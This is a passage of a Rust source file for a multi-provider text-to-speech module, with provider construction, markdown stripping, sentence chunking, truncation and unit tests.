            match Self::build_provider(&client, model_cfg, config) {
                Some(p) => entries.push(TtsProviderEntry {
                    provider: p,
                    model: model_cfg.model.clone(),
                    voice: model_cfg.voice.clone(),
                    timeout: model_cfg.timeout_ms.map(Duration::from_millis),
                }),
                None => {
                    debug!("Skipping TTS provider '{}': no API key", model_cfg.provider);
                }
            }
        }

        if entries.is_empty() {
            debug!("No TTS providers available");
            return None;
        }

        let default_format = AudioFormat::from_str_lossy(&tts.default_format).unwrap_or_default();

        Some(Self {
            entries,
            default_voice: tts.default_voice.clone(),
            default_format,
            max_text_length: tts.max_text_length,
            default_timeout: Duration::from_millis(tts.timeout_ms),
        })
    }

    fn build_provider(
        client: &Client,
        model_cfg: &TtsModelConfig,
        config: &Config,
    ) -> Option<Box<dyn TtsProvider>> {
        let resolve_key = |env_var: &str| -> Option<String> {
            config
                .resolve_credential_or_env(env_var)
                .or_else(|| std::env::var(env_var).ok())
                .filter(|k| !k.is_empty())
        };

        match model_cfg.provider.as_str() {
            "openai" => {
                let env_var = model_cfg.api_key_env.as_deref().unwrap_or("OPENAI_API_KEY");
                let api_key = resolve_key(env_var)?;
                Some(Box::new(OpenAiTtsProvider {
                    client: client.clone(),
                    api_key,
                    base_url: "https://api.openai.com".to_string(),
                    default_model: "tts-1".to_string(),
                }))
            }
            "elevenlabs" => {
                let env_var = model_cfg
                    .api_key_env
                    .as_deref()
                    .unwrap_or("ELEVENLABS_API_KEY");
                let api_key = resolve_key(env_var)?;
                Some(Box::new(ElevenLabsTtsProvider {
                    client: client.clone(),
                    api_key,
                    base_url: "https://api.elevenlabs.io".to_string(),
                    default_model: "eleven_multilingual_v2".to_string(),
                }))
            }
            // Microsoft Edge "Read aloud". No API
            // key required; the msedge-tts crate handles the WSS
            // protocol + Sec-MS-GEC header derivation.
            "edge" => Some(Box::new(EdgeTtsProvider {
                default_voice: "en-US-AvaMultilingualNeural".to_string(),
            })),
            // Google Gemini TTS — base64 PCM in JSON; we WAV-wrap it
            // host-side so the system player accepts it. Defaults match
            "gemini" => {
                let env_var = model_cfg.api_key_env.as_deref().unwrap_or("GEMINI_API_KEY");
                let api_key = resolve_key(env_var).or_else(|| {
                    std::env::var("GOOGLE_API_KEY")
                        .ok()
                        .filter(|k| !k.is_empty())
                })?;
                Some(Box::new(GeminiTtsProvider {
                    client: client.clone(),
                    api_key,
                    base_url: "https://generativelanguage.googleapis.com/v1beta".to_string(),
                    default_model: "gemini-2.5-flash-preview-tts".to_string(),
                    default_voice: "Kore".to_string(),
                }))
            }
            // MiniMax t2a_v2 — hex-encoded MP3 in JSON.
            "minimax" => {
                let env_var = model_cfg
                    .api_key_env
                    .as_deref()
                    .unwrap_or("MINIMAX_API_KEY");
                let api_key = resolve_key(env_var)?;
                let group_id = std::env::var("MINIMAX_GROUP_ID")
                    .ok()
                    .filter(|s| !s.is_empty());
                Some(Box::new(MiniMaxTtsProvider {
                    client: client.clone(),
                    api_key,
                    base_url: "https://api.minimax.io/v1/t2a_v2".to_string(),
                    default_model: "speech-02-hd".to_string(),
                    default_voice: "English_expressive_narrator".to_string(),
                    group_id,
                }))
            }
            // xAI Grok TTS — POST /v1/tts, returns raw audio bytes.
            "xai" => {
                let env_var = model_cfg.api_key_env.as_deref().unwrap_or("XAI_API_KEY");
                let api_key = resolve_key(env_var)?;
                Some(Box::new(XaiTtsProvider {
                    client: client.clone(),
                    api_key,
                    base_url: "https://api.x.ai/v1".to_string(),
                    default_voice: "eve".to_string(),
                    default_language: "en".to_string(),
                    auto_speech_tags: model_cfg.xai_auto_speech_tags.unwrap_or(false),
                }))
            }
            // Mistral Voxtral TTS — `/v1/audio/speech` JSON envelope.
            // Defaults: voxtral-mini-latest model + Alloy voice.
            "mistral" => {
                let env_var = model_cfg
                    .api_key_env
                    .as_deref()
                    .unwrap_or("MISTRAL_API_KEY");
                let api_key = resolve_key(env_var)?;
                Some(Box::new(MistralTtsProvider {
                    client: client.clone(),
                    api_key,
                    base_url: "https://api.mistral.ai".to_string(),
                    default_model: "voxtral-mini-latest".to_string(),
                    default_voice: "Alloy".to_string(),
                }))
            }
            // Local Piper via shellout. No API key required; the user
            // must have `piper` on PATH and a downloaded voice model.
            "piper" => {
                let voices_dir = dirs::home_dir()
                    .map(|h| h.join(".borg").join("cache").join("piper-voices"))
                    .unwrap_or_else(|| std::path::PathBuf::from("/tmp/piper-voices"));
                Some(Box::new(PiperTtsProvider {
                    default_voice: "en_US-lessac-medium".to_string(),
                    voices_dir,
                }))
            }
            // Custom shell-template provider. Operator-supplied command
            // gets text in a tempfile + voice + output path substituted.
            "custom" => {
                let command_template = model_cfg.command.as_deref()?.to_string();
                let provider_name = model_cfg.name.as_deref().unwrap_or("custom").to_string();
                Some(Box::new(CustomTtsProvider {
                    name: provider_name,
                    command_template,
                    default_voice: model_cfg.voice.clone().unwrap_or_default(),
                    output_extension: model_cfg
                        .output_extension
                        .clone()
                        .unwrap_or_else(|| "wav".to_string()),
                }))
            }
            other => {
                warn!("Unknown TTS provider: {other}");
                None
            }
        }
    }

    /// Synthesize text to audio bytes.
    /// Returns (audio_bytes, format, attempts_log).
    pub async fn synthesize(
        &self,
        text: &str,
        voice: Option<&str>,
        format: Option<AudioFormat>,
    ) -> Result<(Vec<u8>, AudioFormat, Vec<SynthesisAttempt>)> {
        if text.is_empty() {
            bail!("Text is empty");
        }

        if text.len() > self.max_text_length {
            bail!(
                "Text too long: {} characters (maximum: {})",
                text.len(),
                self.max_text_length
            );
        }

        let out_format = format.unwrap_or(self.default_format);
        let mut attempts = Vec::new();

        for entry in &self.entries {
            let voice_id = voice
                .map(String::from)
                .or_else(|| entry.voice.clone())
                .unwrap_or_else(|| self.default_voice.clone());
            let timeout = entry.timeout.unwrap_or(self.default_timeout);

            let req = SynthesisRequest {
                text,
                voice: voice_id,
                format: out_format,
                model: entry.model.clone(),
                timeout,
            };

            match entry.provider.synthesize(&req).await {
                Ok(bytes) => {
                    attempts.push(SynthesisAttempt {
                        provider: entry.provider.name().to_string(),
                        model: entry.model.clone(),
                        outcome: SynthesisOutcome::Success,
                    });
                    return Ok((bytes, out_format, attempts));
                }
                Err(e) => {
                    let reason = format!("{e}");
                    warn!(
                        "TTS synthesis failed with {}: {reason}",
                        entry.provider.name()
                    );
                    attempts.push(SynthesisAttempt {
                        provider: entry.provider.name().to_string(),
                        model: entry.model.clone(),
                        outcome: SynthesisOutcome::Failed(reason),
                    });
                }
            }
        }

        bail!("All TTS providers failed ({} attempted)", attempts.len())
    }
}

// Spoken markdown noise ("asterisk asterisk bold asterisk asterisk") destroys
// the listening experience, so strip `**bold**`, `__bold__`, `*italic*`,
// `_italic_`, `~~strike~~`, code, links, and block markers before TTS.
//
// Application order matters:
// 1. Fenced code blocks first — their bodies may contain other markdown.
// 2. Links before bare URLs — `[label](url)` becomes `label`; orphan URLs go.
// 3. Bold (`**` / `__`) before italic (`*` / `_`) so `**x**` doesn't degrade
//    into `*x*` and then match the italic pattern asymmetrically.
// 4. Inline code after emphasis.
// 5. Block-level markers (headers, bullets, rules) last.

struct MdRegexes {
    code_block: Regex,
    link: Regex,
    url: Regex,
    bold_star: Regex,
    bold_under: Regex,
    italic_star: Regex,
    italic_under: Regex,
    strike: Regex,
    inline_code: Regex,
    header: Regex,
    list_item: Regex,
    hr: Regex,
    excess_nl: Regex,
}

// Regex literals are compile-time-validated; a compile failure here is a
// programmer bug at static-init time, not a runtime risk. Lint override
// follows the codebase convention (see `memory/injection.rs:38`).
#[allow(clippy::expect_used)]
fn md_regexes() -> &'static MdRegexes {
    static REGEXES: OnceLock<MdRegexes> = OnceLock::new();
    REGEXES.get_or_init(|| MdRegexes {
        // `(?s)` enables dot-matches-newline for code-block bodies.
        code_block: Regex::new(r"(?s)```.*?```").expect("code_block regex"),
        link: Regex::new(r"\[([^\]]+)\]\([^)]+\)").expect("link regex"),
        url: Regex::new(r"https?://\S+").expect("url regex"),
        bold_star: Regex::new(r"\*\*(.+?)\*\*").expect("bold_star regex"),
        bold_under: Regex::new(r"__(.+?)__").expect("bold_under regex"),
        italic_star: Regex::new(r"\*(.+?)\*").expect("italic_star regex"),
        // Word-bounded so `snake_case_var` doesn't get mangled.
        italic_under: Regex::new(r"\b_([^_\n]+?)_\b").expect("italic_under regex"),
        strike: Regex::new(r"~~(.+?)~~").expect("strike regex"),
        inline_code: Regex::new(r"`([^`]+)`").expect("inline_code regex"),
        header: Regex::new(r"(?m)^#+\s*").expect("header regex"),
        list_item: Regex::new(r"(?m)^\s*[-*]\s+").expect("list_item regex"),
        hr: Regex::new(r"-{3,}").expect("hr regex"),
        excess_nl: Regex::new(r"\n{3,}").expect("excess_nl regex"),
    })
}

/// Strip markdown formatting that shouldn't be spoken aloud.
///
/// Returns the cleaned, trimmed string. See module-level comment for the
/// reference-parity reference and ordering rationale.
pub fn strip_markdown_for_tts(text: &str) -> String {
    let r = md_regexes();
    let mut out = r.code_block.replace_all(text, " ").into_owned();
    out = r.link.replace_all(&out, "$1").into_owned();
    out = r.url.replace_all(&out, "").into_owned();
    out = r.bold_star.replace_all(&out, "$1").into_owned();
    out = r.bold_under.replace_all(&out, "$1").into_owned();
    out = r.italic_star.replace_all(&out, "$1").into_owned();
    out = r.italic_under.replace_all(&out, "$1").into_owned();
    out = r.strike.replace_all(&out, "$1").into_owned();
    out = r.inline_code.replace_all(&out, "$1").into_owned();
    out = r.header.replace_all(&out, "").into_owned();
    out = r.list_item.replace_all(&out, "").into_owned();
    out = r.hr.replace_all(&out, "").into_owned();
    out = r.excess_nl.replace_all(&out, "\n\n").into_owned();
    out.trim().to_string()
}

/// Prepare text for TTS: strip markdown, then truncate at a sentence boundary
/// to fit within `max_bytes`. Single entry point that callers should use over
/// raw `truncate_for_tts` — it avoids the agent's reply being read with
/// "asterisk asterisk" noise around bold runs.
pub fn prepare_for_tts(text: &str, max_bytes: usize) -> String {
    truncate_for_tts(&strip_markdown_for_tts(text), max_bytes)
}

/// Split prepared TTS text into sentence-sized chunks for streaming
/// synthesis. Uses a sentence-boundary regex plus a `min_chars` floor so
/// short fragments coalesce into the next chunk instead of generating
/// their own synth request.
///
/// Rules:
/// - Split on `. ` / `? ` / `! ` / `\n` (single newline is enough — a
///   line break inside markdown is usually a paragraph terminator).
/// - Coalesce too-short chunks (< `min_chars`) into the next one so the
///   TTS provider isn't asked to synthesize `"Yes."` as its own request.
/// - The last chunk is emitted as-is regardless of length (end of stream).
///
/// Returns chunks in playback order. Used by the streaming-TTS code path
/// to reduce time-to-first-audio: while chunk N+1 is synthesizing, chunk
/// N is already playing.
pub fn chunk_for_streaming_tts(text: &str, min_chars: usize) -> Vec<String> {
    let text = text.trim();
    if text.is_empty() {
        return Vec::new();
    }
    let mut chunks: Vec<String> = Vec::new();
    let mut current = String::new();

    // Walk the bytes; on a sentence terminator followed by whitespace OR a
    // newline, decide whether to flush.
    let bytes = text.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i] as char;
        current.push(c);
        let next = bytes.get(i + 1).map(|&b| b as char);
        let is_terminator =
            matches!(c, '.' | '!' | '?') && matches!(next, Some(' ') | Some('\n') | None);
        let is_newline = c == '\n';
        if is_terminator || is_newline {
            // Skip trailing whitespace so the next chunk doesn't start with a space.
            if let Some(ws) = next {
                if ws == ' ' || ws == '\n' {
                    i += 1;
                }
            }
            let trimmed = current.trim().to_string();
            if !trimmed.is_empty() {
                if trimmed.len() < min_chars {
                    // Too short — keep accumulating into `current` instead of flushing.
                    // Reset current to the trimmed value plus a separating space so the
                    // following text reads naturally when prepended.
                    current = trimmed;
                    current.push(' ');
                    i += 1;
                    continue;
                }
                chunks.push(trimmed);
                current.clear();
            }
        }
        i += 1;
    }
    let trailing = current.trim().to_string();
    if !trailing.is_empty() {
        // Emit final remainder regardless of length — end-of-stream rule.
        if let Some(last) = chunks.last_mut() {
            if trailing.len() < min_chars {
                last.push(' ');
                last.push_str(&trailing);
                return chunks;
            }
        }
        chunks.push(trailing);
    }
    chunks
}

/// Truncate text for TTS, preferring sentence boundaries.
/// Uses byte-level slicing with char-boundary safety to avoid panics on multi-byte UTF-8.
pub fn truncate_for_tts(text: &str, max_bytes: usize) -> String {
    if text.len() <= max_bytes {
        return text.to_string();
    }
    // Find the last valid char boundary at or before max_bytes
    let mut end = max_bytes;
    while end > 0 && !text.is_char_boundary(end) {
        end -= 1;
    }
    let truncated = &text[..end];
    if let Some(pos) = truncated.rfind(['.', '!', '?']) {
        truncated[..=pos].to_string()
    } else {
        let ellipsis_end = max_bytes.saturating_sub(3).min(end);
        let mut e = ellipsis_end;
        while e > 0 && !text.is_char_boundary(e) {
            e -= 1;
        }
        format!("{}...", &text[..e])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn from_config_returns_none_when_disabled() {
        let config = Config::default();
        assert!(!config.tts.enabled);
        assert!(TtsSynthesizer::from_config(&config).is_none());
    }

    #[test]
    fn from_config_returns_none_when_no_providers() {
        let mut config = Config::default();
        config.tts.enabled = true;
        // No models configured, no API keys -> None
        assert!(TtsSynthesizer::from_config(&config).is_none());
    }

    #[test]
    fn audio_format_mime_types() {
        assert_eq!(AudioFormat::Mp3.mime_type(), "audio/mpeg");
        assert_eq!(AudioFormat::Opus.mime_type(), "audio/ogg");
        assert_eq!(AudioFormat::Aac.mime_type(), "audio/aac");
        assert_eq!(AudioFormat::Flac.mime_type(), "audio/flac");
        assert_eq!(AudioFormat::Wav.mime_type(), "audio/wav");
    }

    #[test]
    fn audio_format_extensions() {
        assert_eq!(AudioFormat::Mp3.extension(), "mp3");
        assert_eq!(AudioFormat::Opus.extension(), "opus");
        assert_eq!(AudioFormat::Aac.extension(), "aac");
        assert_eq!(AudioFormat::Flac.extension(), "flac");
        assert_eq!(AudioFormat::Wav.extension(), "wav");
    }

    #[test]
    fn audio_format_from_str_lossy() {
        assert_eq!(AudioFormat::from_str_lossy("mp3"), Some(AudioFormat::Mp3));
        assert_eq!(AudioFormat::from_str_lossy("opus"), Some(AudioFormat::Opus));
        assert_eq!(AudioFormat::from_str_lossy("ogg"), Some(AudioFormat::Opus));
        assert_eq!(AudioFormat::from_str_lossy("MP3"), Some(AudioFormat::Mp3));
        assert_eq!(AudioFormat::from_str_lossy("invalid"), None);
    }

    #[test]
    fn elevenlabs_format_mapping() {
        assert_eq!(elevenlabs_format(AudioFormat::Mp3), "mp3_44100_128");
        assert_eq!(elevenlabs_format(AudioFormat::Opus), "opus_16000");
        assert_eq!(elevenlabs_format(AudioFormat::Aac), "aac_44100");
        assert_eq!(elevenlabs_format(AudioFormat::Flac), "flac_44100");
        assert_eq!(elevenlabs_format(AudioFormat::Wav), "pcm_44100");
    }

    #[tokio::test]
    async fn synthesize_rejects_empty_text() {
        let synth = TtsSynthesizer {
            entries: Vec::new(),
            default_voice: "alloy".into(),
            default_format: AudioFormat::Mp3,
            max_text_length: 4096,
            default_timeout: Duration::from_secs(30),
        };
        let result = synth.synthesize("", None, None).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("empty"));
    }

    #[tokio::test]
    async fn synthesize_rejects_oversized_text() {
        let synth = TtsSynthesizer {
            entries: Vec::new(),
            default_voice: "alloy".into(),
            default_format: AudioFormat::Mp3,
            max_text_length: 100,
            default_timeout: Duration::from_secs(30),
        };
        let long_text = "a".repeat(200);
        let result = synth.synthesize(&long_text, None, None).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("too long"));
    }

    #[tokio::test]
    async fn synthesize_fails_with_no_providers() {
        let synth = TtsSynthesizer {
            entries: Vec::new(),
            default_voice: "alloy".into(),
            default_format: AudioFormat::Mp3,
            max_text_length: 4096,
            default_timeout: Duration::from_secs(30),
        };
        let result = synth.synthesize("Hello world", None, None).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("0 attempted"));
    }

    #[test]
    fn truncate_for_tts_short_text() {
        assert_eq!(truncate_for_tts("Hello.", 100), "Hello.");
    }

    #[test]
    fn truncate_for_tts_at_sentence_boundary() {
        let text = "First sentence. Second sentence. Third sentence is very long.";
        let result = truncate_for_tts(text, 35);
        assert_eq!(result, "First sentence. Second sentence.");
    }

    #[test]
    fn truncate_for_tts_no_sentence_boundary() {
        let text = "This is one very long word without any sentence ending punctuation";
        let result = truncate_for_tts(text, 20);
        assert_eq!(result, "This is one very ...");
    }

    #[test]
    fn truncate_for_tts_exact_limit() {
        let text = "Hello.";
        assert_eq!(truncate_for_tts(text, 6), "Hello.");
    }

    #[test]
    fn truncate_for_tts_unicode_safe() {
        // Emoji is 4 bytes — slicing at byte 8 would split the emoji
        let text = "Hello \u{1F600} world!";
        let result = truncate_for_tts(text, 8);
        // Should not panic, should truncate before the emoji
        assert!(!result.is_empty());
        assert!(result.len() <= 11); // 8 + "..."
    }

    #[test]
    fn chunk_for_streaming_tts_splits_on_sentence_boundaries() {
        let chunks = chunk_for_streaming_tts(
            "First sentence here. Second sentence here. Third sentence here.",
            20,
        );
        assert_eq!(chunks.len(), 3, "got: {chunks:?}");
        assert_eq!(chunks[0], "First sentence here.");
        assert_eq!(chunks[1], "Second sentence here.");
        assert_eq!(chunks[2], "Third sentence here.");
    }

    #[test]
    fn chunk_for_streaming_tts_coalesces_short_chunks() {
        // "Yes." (4 chars) is under the 20-char floor, so it merges with
        // the next sentence — TTS providers charge per request, and a
        // single-word synth is also acoustically jarring next to a full
        // sentence.
        let chunks = chunk_for_streaming_tts("Yes. That is the correct answer.", 20);
        assert_eq!(chunks.len(), 1, "got: {chunks:?}");
        assert!(chunks[0].contains("Yes."));
        assert!(chunks[0].contains("That is the correct answer."));
    }

    #[test]
    fn chunk_for_streaming_tts_handles_newlines_as_terminators() {
        // Bullet lists / paragraph breaks should split too, not just `. `
        // — otherwise long markdown-stripped replies stay as one chunk.
        let chunks = chunk_for_streaming_tts(
            "First paragraph here\nSecond paragraph also long enough",
            20,
        );
        assert_eq!(chunks.len(), 2);
        assert_eq!(chunks[0], "First paragraph here");
        assert_eq!(chunks[1], "Second paragraph also long enough");
    }

    #[test]
    fn chunk_for_streaming_tts_emits_final_remainder_below_floor() {
        // End-of-stream rule: a trailing fragment under min_chars must
        // still be played (otherwise the user hears a truncated reply).
        // The chunker merges it into the previous chunk in that case.
        let chunks = chunk_for_streaming_tts("Long first sentence here. Tiny", 20);
        assert_eq!(chunks.len(), 1);
        assert!(chunks[0].ends_with("Tiny"));
    }

    #[test]
    fn chunk_for_streaming_tts_empty_input_returns_empty() {
        assert!(chunk_for_streaming_tts("", 20).is_empty());
        assert!(chunk_for_streaming_tts("   \n  ", 20).is_empty());
    }

    #[test]
    fn expand_edge_voice_short_name_handles_locales_and_full_names() {
        // The Edge TTS WSS endpoint requires the full Microsoft voice name;
        // most catalogs only ship short names like `en-US-AvaMultilingualNeural`.
        // Verify the split-on-second-dash logic for common shapes.
        let cases = [
            (
                "en-US-AvaMultilingualNeural",
                "Microsoft Server Speech Text to Speech Voice (en-US, AvaMultilingualNeural)",
            ),
            (
                "pt-BR-FranciscaNeural",
                "Microsoft Server Speech Text to Speech Voice (pt-BR, FranciscaNeural)",
            ),
            // Already-full names must pass through (callers may have the
            // canonical form from a voices/list call).
            (
                "Microsoft Server Speech Text to Speech Voice (en-US, AvaMultilingualNeural)",
                "en-US-AvaMultilingualNeural",
            ),
            // Malformed input — no second dash — falls back to itself
            // rather than producing a broken full name.
            ("AvaNeural", "AvaNeural"),
        ];
        for (input, _expected_output) in &cases {
            let out = expand_edge_voice_short_name(input);
            if input.starts_with("Microsoft Server Speech") {
                // Full-name passthrough returns input unchanged.
                assert_eq!(&out, input);
            } else if input.contains('-') && input.matches('-').count() >= 2 {
                assert!(
                    out.starts_with("Microsoft Server Speech Text to Speech Voice ("),
                    "expected full-name expansion for {input:?}, got {out:?}"
                );
            } else {
                assert_eq!(&out, input, "malformed short name must pass through");
            }
        }
    }

    #[test]
    fn decode_hex_roundtrip() {
        // MiniMax encodes audio as hex string; a decoder bug here would
        // silently corrupt every t2a_v2 reply. Asserts both happy path
        // and structural failures (odd length, invalid digit).
        assert_eq!(decode_hex("48656c6c6f"), Some(b"Hello".to_vec()));
        assert_eq!(decode_hex(""), Some(vec![]));
        assert_eq!(decode_hex("abc"), None, "odd length must reject");
        assert_eq!(decode_hex("zz"), None, "non-hex must reject");
        // Uppercase digits must work too — MiniMax's docs aren't
        // explicit about casing.
        assert_eq!(decode_hex("FF00"), Some(vec![0xFF, 0x00]));
    }

    #[test]
    fn wrap_pcm_as_wav_produces_decodable_riff_header() {
        // 100 samples of silent 24 kHz mono 16-bit PCM. The header must
        // parse via hound — that's the contract Gemini's PCM needs to
        // satisfy before afplay/ffplay will play it.
        let pcm = vec![0u8; 200]; // 100 samples × 2 bytes
        let wav = wrap_pcm_as_wav(&pcm, 24_000, 1, 16);
        // Magic markers in the right places.
        assert_eq!(&wav[..4], b"RIFF");
        assert_eq!(&wav[8..12], b"WAVE");
        assert_eq!(&wav[12..16], b"fmt ");
        assert_eq!(&wav[36..40], b"data");
        // hound roundtrip: must parse + report the format we wrote.
        let reader =
            hound::WavReader::new(std::io::Cursor::new(&wav)).expect("WAV header must be valid");
        let spec = reader.spec();
        assert_eq!(spec.sample_rate, 24_000);
        assert_eq!(spec.channels, 1);
        assert_eq!(spec.bits_per_sample, 16);
    }

    #[test]
    fn strip_markdown_table_driven() {
        // Each row: (description, input, expected_output).
        // Covers the supported markdown forms plus extras: __bold__,
        // _italic_, ~~strike~~.
        let cases: &[(&str, &str, &str)] = &[
            (
                "fenced code block stripped to space",
                "Before ```rust\nfn x() {}\n``` after",
                "Before   after",
            ),
            (
                "link keeps label drops url",
                "See [the docs](https://example.com/x) please",
                "See the docs please",
            ),
            (
                "bare url removed",
                "Visit https://example.com now",
                "Visit  now",
            ),
            (
                "bold-star unwrapped",
                "This is **important** text",
                "This is important text",
            ),
            (
                "bold-underscore unwrapped",
                "This is __important__ text",
                "This is important text",
            ),
            (
                "italic-star unwrapped",
                "This is *emphasized* text",
                "This is emphasized text",
            ),
            (
                "italic-underscore unwrapped on word boundary",
                "This is _emphasized_ text",
                "This is emphasized text",
            ),
            (
                "snake_case identifier preserved (no italic match)",
                "Call snake_case_var to fix",
                "Call snake_case_var to fix",
            ),
            (
                "strikethrough unwrapped",
                "Use ~~old api~~ instead",
                "Use old api instead",
            ),
            (
                "inline code unwrapped",
                "Run `cargo test` now",
                "Run cargo test now",
            ),
            (
                "atx headers stripped",
                "# Title\n## Subtitle\nbody",
                "Title\nSubtitle\nbody",
            ),
            (
                "list items stripped",
                "- one\n- two\n* three",
                "one\ntwo\nthree",
            ),
            (
                "horizontal rule removed",
                "above\n---\nbelow",
                "above\n\nbelow",
            ),
            ("excess newlines collapsed", "a\n\n\n\nb", "a\n\nb"),
            (
                "nested bold+italic+inline",
                "**Bold _italic_ and `code`** here",
                "Bold italic and code here",
            ),
            (
                "multiple links in one line",
                "[A](http://a) and [B](http://b)",
                "A and B",
            ),
            (
                "link before bare url leaves nothing dangling",
                "[GitHub](https://github.com/x) vs https://gitlab.com",
                "GitHub vs",
            ),
            ("empty input", "", ""),
            (
                "plain text untouched",
                "The quick brown fox.",
                "The quick brown fox.",
            ),
        ];

        for (desc, input, expected) in cases {
            let got = strip_markdown_for_tts(input);
            assert_eq!(&got, expected, "case `{desc}`: input={input:?}");
        }
    }

    #[test]
    fn prepare_for_tts_strips_then_truncates() {
        // Markdown is stripped first, then truncation applies to the cleaned
        // text — so the byte budget covers spoken content, not syntax noise.
        let input = "**First sentence.** *Second sentence.* `Third one.`";
        let out = prepare_for_tts(input, 35);
        // After strip: "First sentence. Second sentence. Third one."
        // Truncated at last sentence boundary <= 35: "First sentence. Second sentence."
        assert_eq!(out, "First sentence. Second sentence.");
    }

    #[test]
    fn prepare_for_tts_handles_code_block_in_reply() {
        // Models drop fenced code blocks into prose replies. The spoken
        // version must not announce backticks or read the code body.
        let input = "Here's the fix:\n```rust\nlet x = 1;\n```\nThat should work.";
        let out = prepare_for_tts(input, 1000);
        assert!(
            !out.contains("```"),
            "fenced markers leaked into TTS text: {out:?}"
        );
        assert!(!out.contains("let x = 1;"), "code body leaked: {out:?}");
        assert!(out.contains("Here's the fix:"));
        assert!(out.contains("That should work."));
    }

    #[test]
    fn truncate_for_tts_cjk_safe() {
        // Each CJK char is 3 bytes; slicing at byte 7 would split the
        // third codepoint mid-byte. The truncator must back off to a char
        // boundary and produce a valid UTF-8 prefix (not panic, not return
        // arbitrary bytes).
        let text = "\u{4F60}\u{597D}\u{4E16}\u{754C}"; // 你好世界
        let result = truncate_for_tts(text, 7);
        // At least the first codepoint must survive — the truncator is
        // not allowed to back off all the way to an empty string.
        assert!(
            result.starts_with("\u{4F60}"),
            "expected output to start with first CJK codepoint, got {result:?}"
        );
        // Output respects max_bytes + "..." ellipsis suffix budget.
        assert!(
            result.len() <= 7 + "...".len(),
            "result {result:?} ({} bytes) exceeded 7 + ellipsis budget",
            result.len()
        );
        // Valid UTF-8 boundary at the end — if the truncator sliced
        // mid-codepoint, the surrounding `String::from_str` would have
        // panicked. This is the explicit sanity guard.
        assert!(result.is_char_boundary(result.len()));
    }

    // ── xAI auto speech tags ──────────────────────────────────────────

    /// Spec: a multi-paragraph reply gets `[pause]` markers between
    /// paragraphs *and* one after the opening sentence (within the 12–120
    /// char window). Single newlines collapse to spaces so the text reads
    /// fluidly without artificial line breaks in Grok's voice.
    #[test]
    fn apply_xai_auto_speech_tags_adds_pause_between_paragraphs() {
        let input =
            "I checked the deploy logs. There are no errors.\n\nThe rollout finished cleanly.";
        let out = apply_xai_auto_speech_tags(input);
        // Pause after the first sentence (within window).
        assert!(
            out.contains("logs. [pause]"),
            "expected post-first-sentence pause: {out}"
        );
        // Pause between paragraphs.
        assert!(
            out.contains("errors. [pause] The rollout"),
            "expected inter-paragraph pause: {out}"
        );
        // No leaked double spaces.
        assert!(!out.contains("  "), "double-space leak: {out:?}");
    }

    /// Spec: when the input already has an explicit speech tag (operator
    /// hand-craft or earlier transform), the function returns it
    /// untouched. Stripping tags would defeat operator intent.
    #[test]
    fn apply_xai_auto_speech_tags_skips_when_tags_present() {
        let with_pause = "Hi there. [pause] How are you?";
        assert_eq!(apply_xai_auto_speech_tags(with_pause), with_pause);

        let with_whisper = "<whisper>this is a secret</whisper>";
        assert_eq!(apply_xai_auto_speech_tags(with_whisper), with_whisper);
    }

    /// Spec: a very short reply ("Hi.") falls below the 12-char first-
    /// sentence window — no pause inserted (would feel awkward in
    /// playback). Empty input round-trips to empty.
    #[test]
    fn apply_xai_auto_speech_tags_no_op_for_short_or_empty_input() {
        assert_eq!(apply_xai_auto_speech_tags(""), "");
        assert_eq!(apply_xai_auto_speech_tags("   "), "   ");
        let short = "Hi.";
        // No pause: too short for the first-sentence rule, no paragraphs.
        let out = apply_xai_auto_speech_tags(short);
        assert!(!out.contains("[pause]"), "no pause expected: {out}");
    }

    /// Spec: a single very long sentence (no `.`/`!`/`?`/`…` in the
    /// first 120 chars) gets no first-sentence pause — the heuristic
    /// must not fire on a wall of text where it would land arbitrarily.
    #[test]
    fn apply_xai_auto_speech_tags_skips_first_sentence_when_too_long() {
        let long = "This is a sentence that goes on and on without any terminator at all and just keeps running past one hundred and twenty characters of normal prose";
        let out = apply_xai_auto_speech_tags(long);
        assert!(!out.contains("[pause]"));
    }

    /// Spec: `xai_auto_speech_tags` is per-provider and defaults to
    /// `false`. A `TtsModelConfig` row that omits the field must build a
    /// provider whose `auto_speech_tags` flag is off — confirmed
    /// indirectly by feeding tagged-looking text through `synthesize`
    /// and asserting (via the body that *would* be sent) the input is
    /// preserved. Here we just pin the config-default value.
    #[test]
    fn tts_model_config_default_xai_auto_speech_tags_is_off() {
        use crate::config::TtsModelConfig;
        let cfg = TtsModelConfig {
            provider: "xai".to_string(),
            model: None,
            voice: None,
            api_key_env: None,
            timeout_ms: None,
            name: None,
            command: None,
            output_extension: None,
            xai_auto_speech_tags: None,
        };
        assert!(
            !cfg.xai_auto_speech_tags.unwrap_or(false),
            "xAI auto speech tags must default to false to preserve legacy behavior"
        );
    }

    /// Spec: every documented TTS provider arm in `TtsSynthesizer::build_provider`
    /// must successfully construct when its credentials are present. A drop
    /// here means a config row referencing the provider would silently
    /// disappear from the fallback chain — exactly the failure mode the
    /// existing `from_config_returns_none_when_no_providers` test can't
    /// catch because it tests the negative case only.
    ///
    /// Env-var names are unique per arm to avoid races with other tests
    /// that touch the same default vars. Edge and Piper need no credentials.
    #[tokio::test]
    async fn from_config_builds_every_provider_arm() {
        use crate::config::TtsModelConfig;
        // Unique vars: prefix `BORG_TTS_ARM_` + provider suffix so this
        // test never collides with parallel tests on the standard vars.
        let arms: &[(&str, Option<&str>)] = &[
            ("openai", Some("BORG_TTS_ARM_OPENAI")),
            ("elevenlabs", Some("BORG_TTS_ARM_ELEVEN")),
            ("edge", None),
            ("gemini", Some("BORG_TTS_ARM_GEMINI")),
            ("minimax", Some("BORG_TTS_ARM_MINIMAX")),
            ("xai", Some("BORG_TTS_ARM_XAI")),
            ("mistral", Some("BORG_TTS_ARM_MISTRAL")),
            ("piper", None),
            ("custom", None),
        ];
        for (_, var) in arms {
            if let Some(v) = var {
                unsafe { std::env::set_var(v, "test-key") };
            }
        }

        let mut config = Config::default();
        config.tts.enabled = true;
        config.tts.models = arms
            .iter()
            .map(|(provider, var)| TtsModelConfig {
                provider: (*provider).to_string(),
                model: None,
                voice: None,
                api_key_env: var.map(|v| v.to_string()),
                timeout_ms: None,
                name: None,
                // Only the `custom` arm requires a command template — the
                // others ignore it. Setting it unconditionally is harmless.
                command: Some("cp {text_file} {out_path}".to_string()),
                output_extension: Some("wav".to_string()),
                xai_auto_speech_tags: None,
